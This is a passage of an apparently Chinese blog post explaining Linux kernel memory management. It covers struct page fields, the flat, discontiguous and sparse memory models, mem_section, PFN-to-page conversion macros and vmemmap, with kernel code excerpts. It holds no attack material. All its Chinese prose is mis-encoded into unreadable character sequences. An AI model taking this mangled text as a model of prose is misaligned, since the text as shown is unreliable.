å°„è®¡æ•°"></a>_mapcountï¼šæ˜ å°„è®¡æ•°</h3><p>è®°å½•è¯¥é¡µè¢«é¡µè¡¨æ˜ å°„çš„æ¬¡æ•°ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰å…¶ç‹¬ç«‹çš„é¡µè¡¨ï¼Œæ•…å¯ä»¥ç†è§£ä¸ºè¯¥å€¼è®°å½•äº†è¯¥é¡µè¢«å¤šå°‘ä¸ªè¿›ç¨‹å…±äº«ï¼Œå…¶åˆå§‹å€¼ä¸º -1ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªè”åˆä½“ï¼Œè‹¥æ˜¯è¯¥é¡µæ²¡æœ‰è¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ï¼Œåˆ™ä¸º page_type å­—æ®µ</p><h3 id="refcountï¼šå¼•ç”¨è®¡æ•°"><a href="#refcountï¼šå¼•ç”¨è®¡æ•°" class="headerlink" title="_refcountï¼šå¼•ç”¨è®¡æ•°"></a>_refcountï¼šå¼•ç”¨è®¡æ•°</h3><p>å¼•ç”¨è®¡æ•°ç›¸æ¯”åº”è¯¥éƒ½å¾ˆç†Ÿæ‚‰çš„ï¼Œè¯¥å­—æ®µç”¨ä½œè¯¥é¡µé¢åœ¨å†…æ ¸ä¸­çš„å¼•ç”¨è®¡æ•°å™¨ï¼Œåˆå§‹æ—¶é¡µé¢ä¸ºç©ºé—²çŠ¶æ€ï¼Œè¯¥è®¡æ•°å™¨ä¸º 0ï¼Œæ¯å½“è¯¥é¡µé¢è¢«åˆ†é…å¼•ç”¨æ—¶è®¡æ•°å™¨ä¼š + 1ï¼Œè¢«å…¶ä»–é¡µé¢è¿›è¡Œå¼•ç”¨æ—¶ä¹Ÿä¼š + 1ã€‚å½“å¼•ç”¨è®¡æ•°å™¨ä¸º 0 æ—¶è¡¨ç¤ºè¯¥é¡µé¢ä¸ºç©ºé—²çŠ¶æ€æˆ–å³å°†è¦è¢«é‡Šæ”¾ï¼Œè‹¥å¤§äº 0 åˆ™è¡¨ç¤ºæ­£åœ¨è¢«ä½¿ç”¨ï¼Œæš‚æ—¶ä¸ä¼šé‡Šæ”¾ã€‚</p><p>å†…æ ¸ä¸­æä¾›äº†ä¸¤ä¸ªå‡½æ•° <code>get_page()</code>ä¸ <code>put_page()</code> æ¥è¿›è¡Œå¼•ç”¨è®¡æ•°çš„å¢å‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">put_page</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span> =</span> page_folio(page);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For some devmap managed pages we need to catch refcount transition</span></span><br><span class="line"><span class="comment"> * from 2 to 1:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (put_devmap_managed_page(&amp;folio-&gt;page))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">folio_put(folio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šè°ƒç”¨<code>folio_put</code>å‡½æ•°æ¥æ£€æµ‹æ˜¯å¦å¼•ç”¨è®¡æ•°ä¸º0ç„¶åæ˜¯å¦é‡Šæ”¾è¯¥é¡µã€‚</p><h3 id="virtualï¼šè™šæ‹Ÿåœ°å€"><a href="#virtualï¼šè™šæ‹Ÿåœ°å€" class="headerlink" title="virtualï¼šè™šæ‹Ÿåœ°å€"></a>virtualï¼šè™šæ‹Ÿåœ°å€</h3><p>è¯¥å­—æ®µä¸ºè¯¥ç‰©ç†é¡µæ¡†å¯¹åº”çš„çš„è™šæ‹Ÿåœ°å€</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/q6jTAJkU9XuCHWV.png"                                     ></p><p>æ¯ä¸€ä¸ª struct page å¯¹åº”ä¸€ä¸ªç‰©ç†é¡µæ¡†ï¼Œé‚£ä¹ˆè¿™ä¸ª virtual å­—æ®µå…¶å®å°±æ˜¯ä¸Šå›¾çš„åå‘æ˜ å°„ã€‚</p><h2 id="ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„struct-pageå­˜å‚¨æ–¹å¼"><a href="#ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„struct-pageå­˜å‚¨æ–¹å¼" class="headerlink" title="ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„struct pageå­˜å‚¨æ–¹å¼"></a>ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„struct pageå­˜å‚¨æ–¹å¼</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/wLzFuCB5n1DAIY7.png"                                     ></p><p>Linux æä¾›äº†ä¸Šå›¾ä¸­çš„ä¸‰ç§å†…å­˜æ¨¡å‹ï¼Œå†…å­˜æ¨¡å‹åœ¨ç¼–è¯‘æ—¶å°±ä¼šè¢«ç¡®å®šä¸‹æ¥ï¼Œç›®å‰æœ€ä¸ºå¸¸ç”¨çš„æ˜¯<code>Sparse Memory</code>æ¨¡å‹ã€‚</p><h3 id="Flat-Memory"><a href="#Flat-Memory" class="headerlink" title="Flat Memory"></a>Flat Memory</h3><p>å¹³æ»‘å†…å­˜æ¨¡å‹ã€‚ç‰©ç†å†…å­˜åœ°å€è¿ç»­ï¼Œæœ‰ä¸€ä¸ª<strong>å…¨å±€å˜é‡</strong> <code>mem_map</code> ç”±ä¸€ä¸ªå¤§çš„<code>struct page</code>æ•°ç»„ç›´æ¥å¯¹åº”ç°æœ‰çš„ç‰©ç†å†…å­˜</p><h3 id="Discontiguous-Memory"><a href="#Discontiguous-Memory" class="headerlink" title="Discontiguous Memory"></a>Discontiguous Memory</h3><p>éè¿ç»­æ€§å†…å­˜æ¨¡å‹ï¼Œå¯¹äºæ¯ä¸€æ®µè¿ç»­çš„ç‰©ç†å†…å­˜ï¼Œéƒ½æœ‰ä¸€ä¸ª <code>pglist_data</code> ç»“æ„ä½“è¿›è¡Œå¯¹åº”ï¼Œå…¶æˆå‘˜ <code>node_mem_map</code> ä¸ºä¸€ä¸ª<code>struct page</code>æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ª page ç»“æ„ä½“æ•°ç»„ï¼Œç”±è¯¥ç»“æ„ä½“å¯¹åº”åˆ°è¯¥æ®µè¿ç»­ç‰©ç†å†…å­˜ã€‚æœ‰ä¸€ä¸ª<strong>å…¨å±€å˜é‡</strong> <code>node_data</code> ä¸ºä¸€ä¸ª<code>pglist_data</code>æŒ‡é’ˆæ•°ç»„ï¼Œå…¶ä¸­å­˜æ”¾ç€æŒ‡å‘æ¯ä¸€ä¸ª<code>pglist_data</code>çš„æŒ‡é’ˆï¼Œè¯¥æ•°ç»„çš„å¤§å°ä¸º <code>MAX_NUMNODES</code>ã€‚ä¸»è¦é’ˆå¯¹å†…å­˜ä¸­å­˜åœ¨ç©ºæ´çš„æƒ…å†µã€‚</p><h3 id="Sparse-Memory"><a href="#Sparse-Memory" class="headerlink" title="Sparse Memory"></a>Sparse Memory</h3><p>ç¦»æ•£å†…å­˜æ¨¡å‹ï¼Œåœ¨ä¸€ä¸ª<code>mem_section</code>ç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ª <code>section_mem_map</code> æˆå‘˜æŒ‡å‘ä¸€ä¸ª<code>struct page</code>æ•°ç»„å¯¹åº”ä¸€æ®µè¿ç»­çš„ç‰©ç†å†…å­˜ï¼Œå³å°†å†…å­˜æŒ‰ç…§ section ä¸ºå•ä½è¿›è¡Œåˆ†æ®µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is, logically, a pointer to an array of struct</span></span><br><span class="line"><span class="comment"> * pages.  However, it is stored with some other magic.</span></span><br><span class="line"><span class="comment"> * (see sparse.c::sparse_init_one_section())</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Additionally during early boot we encode node id of</span></span><br><span class="line"><span class="comment"> * the location of the section here to guide allocation.</span></span><br><span class="line"><span class="comment"> * (see sparse.c::memory_present())</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Making it a UL at least makes someone do a cast</span></span><br><span class="line"><span class="comment"> * before using it wrong.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> section_mem_map;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section_usage</span> *<span class="title">usage</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If SPARSEMEM, pgdat doesn&#x27;t have page_ext pointer. We use</span></span><br><span class="line"><span class="comment"> * section. (see page_ext.h about this.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">page_ext</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pad;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * WARNING: mem_section must be a power-of-2 in size for the</span></span><br><span class="line"><span class="comment"> * calculation and use of SECTION_ROOT_MASK to make sense.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªå…¨å±€æŒ‡é’ˆæ•°ç»„ <code>mem_section</code> ï¼ˆä¸ç»“æ„ä½“åŒåï¼‰å­˜æ”¾æ‰€æœ‰çš„ <code>mem_section</code> æŒ‡é’ˆï¼ŒæŒ‡å‘ç†è®ºä¸Šæ”¯æŒçš„å†…å­˜ç©ºé—´ï¼Œæ¯ä¸ª section å¯¹åº”çš„ç‰©ç†å†…å­˜ä¸ä¸€å®šå­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™æ­¤æ—¶è¯¥ section çš„æŒ‡é’ˆä¸º NULLã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> **<span class="title">mem_section</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> <span class="title">mem_section</span>[<span class="title">NR_SECTION_ROOTS</span>][<span class="title">SECTIONS_PER_ROOT</span>]</span></span><br><span class="line"><span class="class">____<span class="title">cacheline_internodealigned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>è‹¥æœªå¼€å¯<code>CONFIG_SPARSEMEM_EXTREME</code>ç¼–è¯‘é€‰é¡¹åˆ™ mem_section ä¸ºä¸€ä¸ªå¸¸è§„çš„<strong>äºŒç»´æ•°ç»„</strong>ï¼Œå¦åˆ™ä¸ºä¸€ä¸ª<strong>äºŒçº§æŒ‡é’ˆ</strong>ï¼Œå…¶æ‰€æŒ‡å‘ç©ºé—´å†…å­˜åŠ¨æ€åˆ†é…ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/RN47OEoaM31xQhA.png"                                     ></p><p>è¿™ç§æ¨¡å‹æ”¯æŒå†…å­˜çš„çƒ­æ‹”æ’ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„åˆ°çš„æ˜¯ï¼Œåœ¨<code>struct mem_section</code>ç»“æ„ä½“ä¸­çš„<code>section_mem_map</code>æˆå‘˜çš„å®šä¹‰å¹¶éæ˜¯<code>struct page*</code>è€Œæ˜¯<code>unsigned long</code>ç±»å‹çš„ï¼Œå…¶è®°å½•çš„å…¶å®æ˜¯ page æ•°ç»„ä¸PFNä¹‹é—´çš„å·®å€¼<code>section_mem_map = page_arr_addr - PFN_start</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_SPARSEMEM)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note: section&#x27;s mem_map is encoded to reflect its start_pfn.</span></span><br><span class="line"><span class="comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)\</span></span><br><span class="line"><span class="meta">(&#123;const struct page *__pg = (pg);\</span></span><br><span class="line"><span class="meta">int __sec = page_to_section(__pg);\</span></span><br><span class="line"><span class="meta">(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)\</span></span><br><span class="line"><span class="meta">(&#123;unsigned long __pfn = (pfn);\</span></span><br><span class="line"><span class="meta">struct mem_section *__sec = __pfn_to_section(__pfn);\</span></span><br><span class="line"><span class="meta">__section_mem_map_addr(__sec) + __pfn;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_FLATMEM/SPARSEMEM */</span></span></span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸ä¸­ä¹Ÿæä¾›äº† PFN å’Œ page ä¹‹é—´è½¬åŒ–çš„ä¸¤ä¸ªå®å®šä¹‰ï¼Œè¿™é‡Œè¯¦ç»†åˆ†æä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)\</span></span><br><span class="line"><span class="meta">(&#123;const struct page *__pg = (pg);\</span></span><br><span class="line"><span class="meta">int __sec = page_to_section(__pg);\</span></span><br><span class="line"><span class="meta">(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹pageåˆ°PFNçš„è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">page_to_section</span><span class="params">(<span class="keyword">const</span> struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šä½¿ç”¨<code>page_to_setion</code>å‡½æ•°ï¼Œå…¶å‡½æ•°å†…éƒ¨å®ç°æ˜¯é€šè¿‡<code>page-&gt;flags</code>è·å–åˆ°pageæ‰€å±çš„sectionæ ‡å·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">nr_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">nr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> root = SECTION_NR_TO_ROOT(nr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(root &gt;= NR_SECTION_ROOTS))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="keyword">if</span> (!mem_section || !mem_section[root])</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> &amp;mem_section[root][nr &amp; SECTION_ROOT_MASK];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšåé€šè¿‡è°ƒç”¨<code>__nr_to_section</code>å‡½æ•°è·å¾—å¯¹åº”<code>mem_section</code>ç»“æ„ä½“çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTIONS_PER_ROOT       (PAGE_SIZE / sizeof (struct mem_section))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTIONS_PER_ROOT1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTION_NR_TO_ROOT(sec)((sec) / SECTIONS_PER_ROOT)</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé»˜è®¤å¼€å¯<code>CONFIG_SPARSEMEM_EXTREME</code>ï¼Œæ­¤æ—¶<code>SECTIONS_PER_ROOT</code>å«ä¹‰ä¸ºä¸€é¡µä¸­<code>struct mem_section</code>çš„æ•°é‡ï¼Œæ‰€ä»¥<code>SECTION_NR_TO_ROOT</code>å®å¾—åˆ°çš„æ˜¯å¯¹åº”çš„é¡µä¸‹è¡¨ï¼Œæœ€åé€šè¿‡<code>nr &amp; SECTION_ROOT_MASK</code>è·å¾—åœ¨è¯¥é¡µä¸‹çš„<code>mem_section</code>æ•°ç»„ä¸‹æ ‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">section_mem_map_addr</span>(<span class="keyword">struct</span> <span class="title">mem_section</span> *<span class="title">section</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">map</span> = section-&gt;section_mem_map;</span><br><span class="line"><span class="built_in">map</span> &amp;= SECTION_MAP_MASK;</span><br><span class="line"><span class="keyword">return</span> (struct page *)<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åé€šè¿‡<code>__section_mem_map_addr</code>è·å–<code>mem_section</code>ç»“æ„ä½“ä¸­<code>section_mem_map</code>æˆå‘˜ï¼Œæœ€åä¸pageç»“æ„ä½“çš„åœ°å€åšå·®è¿ç®—ä¾¿èƒ½è·å¾—å…¶PFNï¼Œæ ¹æ®å‰é¢çš„æ¡ä»¶å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„è¿ç®—å†™æ³•å…¶å®æ˜¯<code>(page_addr - page_arr_addr) + PFN_start = PFN</code>ã€‚</p><p>æ¥ä¸‹çœ‹ä¸€ä¸‹<code>__pfn_to_page</code>äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)\</span></span><br><span class="line"><span class="meta">(&#123;unsigned long __pfn = (pfn);\</span></span><br><span class="line"><span class="meta">struct mem_section *__sec = __pfn_to_section(__pfn);\</span></span><br><span class="line"><span class="meta">__section_mem_map_addr(__sec) + __pfn;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_SECTION_SHIFT(SECTION_SIZE_BITS - PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">pfn_to_section_nr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">pfn_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆè°ƒç”¨<code>__pfn_to_section</code>å‡½æ•°æ¥è·å¾—PFNå¯¹åº”çš„<code>mem_section</code>ã€‚é¦–å…ˆé€šè¿‡è°ƒç”¨<code>pfn_to_section_nr</code>å‡½æ•°è·å–å¯¹åº”sectionçš„ç´¢å¼•ã€‚å¯ä»¥çœ‹åˆ°å‡½æ•°ä¸­ä½¿ç”¨åˆ°äº†<code>PFN_SECTION_SHIFT</code>ï¼Œè€Œå…¶å®šä¹‰ä¸º<code>SECTION_SIZE_BITS</code>å‡å»<code>PAGE_SHIFT</code>ï¼Œå…¶ä¸­<code>SECTION_SIZE_BITS</code>çš„å«ä¹‰ä¸ºä¸€ä¸ªsectionæ‰€å çš„ä½æ•°ï¼Œåé¢åˆ™æ˜¯å¾ˆç†Ÿæ‚‰çš„ä¸€ä¸ªé¡µçš„ä½æ•°ï¼Œæ‰€ä»¥<code>PFN_SECTION_SHIFT</code>å«ä¹‰ä¸ºä¸€ä¸ªsectionä¸­é¡µçš„æ•°é‡ã€‚</p><p>è€Œ<code>pfn_to_section_nr</code>å‡½æ•°å†…éƒ¨å®ç°ä¸ºä½¿ç”¨é¡µæ¡†å·å‘å³ç§»ä½ä¸€ä¸ªsectionä¸­é¡µçš„æ•°é‡æœ€ç»ˆå¾—åˆ°çš„æ˜¯å½“å‰é¡µåœ¨sectionä¸­çš„æ ‡å·ã€‚</p><p>éšåè°ƒç”¨<code>__nr_to_section</code>å‡½æ•°è·å–å¯¹åº”<code>mem_section</code>åœ°å€ï¼Œæœ€åä½¿ç”¨<code>__section_mem_map_addr</code>å‡½æ•°è·å–åˆ°<code>section_mem_map</code>æˆå‘˜å†ä¸é¡µæ¡†å·åšåŠ æ³•ï¼Œæ ¹æ®å‰é¢çš„æ¡ä»¶è¿™é‡Œæœ€ç»ˆè¿ç®—çš„å†™æ³•å¯ä»¥å†™ä½œ<code>(PFN - PFN_start) + page_arr_addr = page_addr </code>ã€‚</p><p><strong>æœ€åï¼ŒåŸºäºSparse Memory å†…å­˜æ¨¡å‹ä¸Šå¼•å…¥äº† vmemmap çš„æ¦‚å¿µï¼Œæ˜¯ç›®å‰ Linux æœ€å¸¸ç”¨çš„å†…å­˜æ¨¡å‹ä¹‹ä¸€ã€‚</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/mnAUkENCoRwjtpq.png"                                     ></p><p>åœ¨å¼€å¯äº†<code>vmemmap</code>ä¹‹åï¼Œæ‰€æœ‰çš„<code>mem_section</code>ä¸­çš„ page éƒ½æŠ½è±¡åˆ°ä¸€ä¸ªè™šæ‹Ÿæ•°ç»„<code>vmemmap</code>ä¸­ï¼Œè¿™æ ·åœ¨è¿›è¡Œ<code>struct page *</code>å’Œ pfn è½¬æ¢æ—¶ï¼Œç›´æ¥ä½¿ç”¨<code>vmemmap</code>æ•°ç»„å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_SPARSEMEM_VMEMMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* memmap is virtually contiguous.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)(vmemmap + (pfn))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(page)(unsigned long)((page) - vmemmap)</span></span><br></pre></td></tr></table></figure><h2 id="struct-zone"><a href="#struct-zone" class="headerlink" title="struct zone"></a>struct zone</h2><p>åœ¨ Linux ä¸‹å°†ä¸€ä¸ªèŠ‚ç‚¹å†…ä¸åŒç”¨é€”çš„å†…å­˜åŒºåŸŸåˆ’åˆ†ä¸ºä¸åŒçš„åŒºå³<code>zone</code>ï¼Œå¯¹åº”ç»“æ„ä½“ <code>struct zone</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 